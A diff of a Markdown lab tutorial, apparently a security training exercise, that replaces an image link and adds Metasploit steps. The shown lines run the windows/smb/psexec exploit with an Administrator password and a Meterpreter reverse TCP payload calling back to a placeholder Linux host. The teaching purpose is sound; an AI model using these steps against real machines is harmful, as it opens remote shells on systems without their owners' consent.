@@ -41,8 +41,7 @@ Let’s enable the Windows firewall:
 netsh advfirewall set allprofiles state on
 ```
 
-
-![](attachments/nmap_advfirewallon.png)
+<img width="452" height="35" alt="img02" src="https://github.com/user-attachments/assets/87a58a06-caaf-412f-8c83-152f2a9b729d" />
 
 Let’s try and scan your Windows system from within a **Linux** terminal. Go ahead and open a **Linux** terminal up.
 
@@ -169,10 +168,13 @@ msf6 exploit(windows/smb/psexec) > `set RHOST <Windows IP>`
 
 msf6 exploit(windows/smb/psexec) > `set LHOST <Linux IP>`
 
-
 msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
 
 msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`
+
+msf6 exploit(windows/smb/psexec) > `set payload windows/x64/meterpreter/reverse_tcp`
+
+msf6 exploit(windows/smb/psexec) > `set target 2`
 
 msf6 exploit(windows/smb/psexec) > `exploit`
 
